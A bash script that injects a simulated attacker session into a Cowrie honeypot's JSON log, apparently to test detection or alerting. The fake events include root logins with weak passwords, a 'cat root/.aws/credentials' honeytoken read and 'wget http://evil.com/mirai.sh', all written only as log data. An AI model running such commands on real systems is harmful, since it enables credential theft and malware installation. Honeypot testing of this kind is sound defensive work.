#!/bin/bash

# === CHANGE THIS EVERY RUN ===
SID="MASTER-001"
# ==============================

LOG=~/cowrie/var/log/cowrie/cowrie.json
IP="10.99.99.99"

echo "Injecting Master Simulation: $SID"

# 1. Connect & Client Version
echo "{\"eventid\":\"cowrie.session.connect\",\"session\":\"$SID\",\"src_ip\":\"$IP\",\"timestamp\":\"2026-05-15T12:00:00Z\"}" >> $LOG
echo "{\"eventid\":\"cowrie.client.version\",\"session\":\"$SID\",\"src_ip\":\"$IP\",\"version\":\"SSH-2.0-OpenSSH_8.9\",\"timestamp\":\"2026-05-15T12:00:01Z\"}" >> $LOG

# 2. Authentication (Fail then Success)
echo "{\"eventid\":\"cowrie.login.failed\",\"session\":\"$SID\",\"src_ip\":\"$IP\",\"username\":\"root\",\"password\":\"admin123\",\"timestamp\":\"2026-05-15T12:00:03Z\"}" >> $LOG
echo "{\"eventid\":\"cowrie.login.success\",\"session\":\"$SID\",\"src_ip\":\"$IP\",\"username\":\"root\",\"password\":\"toor\",\"timestamp\":\"2026-05-15T12:00:04Z\"}" >> $LOG

# 3. Reconnaissance Commands
echo "{\"eventid\":\"cowrie.command.input\",\"session\":\"$SID\",\"src_ip\":\"$IP\",\"input\":\"whoami\",\"timestamp\":\"2026-05-15T12:00:10Z\"}" >> $LOG
sleep 1
echo "{\"eventid\":\"cowrie.command.input\",\"session\":\"$SID\",\"src_ip\":\"$IP\",\"input\":\"uname -a\",\"timestamp\":\"2026-05-15T12:00:12Z\"}" >> $LOG
sleep 1

# 4. Honeytoken Trigger (AWS Credentials)
echo "{\"eventid\":\"cowrie.command.input\",\"session\":\"$SID\",\"src_ip\":\"$IP\",\"input\":\"cat root/.aws/credentials\",\"timestamp\":\"2026-05-15T12:00:15Z\"}" >> $LOG
sleep 1

# 5. Malware Download
echo "{\"eventid\":\"cowrie.command.input\",\"session\":\"$SID\",\"src_ip\":\"$IP\",\"input\":\"wget http://evil.com/mirai.sh\",\"timestamp\":\"2026-05-15T12:00:20Z\"}" >> $LOG
sleep 1
# Simulate the actual file transfer event fired by Cowrie
echo "{\"eventid\":\"cowrie.session.file_download\",\"session\":\"$SID\",\"src_ip\":\"$IP\",\"url\":\"http://evil.com/mirai.sh\",\"outfile\":\"/tmp/mirai.sh\",\"shasum\":\"simulated-malware-hash\",\"timestamp\":\"2026-05-15T12:00:22Z\"}" >> $LOG
sleep 1

# 6. Disconnect
echo "{\"eventid\":\"cowrie.session.closed\",\"session\":\"$SID\",\"src_ip\":\"$IP\",\"duration\":25.0,\"timestamp\":\"2026-05-15T12:00:25Z\"}" >> $LOG

echo "Injection Complete!"
